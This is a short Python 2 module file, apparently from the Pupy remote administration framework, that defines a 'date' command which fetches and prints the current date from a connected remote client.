# -*- coding: utf-8 -*-
from pupylib.PupyModule import config, PupyArgumentParser, PupyModule

__class_name__="date"

@config(cat="admin")
class date(PupyModule):
    """ Get current date """
    is_module=False

    dependencies = [ 'pupyutils.basic_cmds' ]

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="date", description=self.__doc__)

    def run(self, args):
        try:
            date = self.client.remote('pupyutils.basic_cmds', 'now', False)
            self.success(date())

        except Exception, e:
            self.error(' '.join(x for x in e.args if type(x) in (str, unicode)))
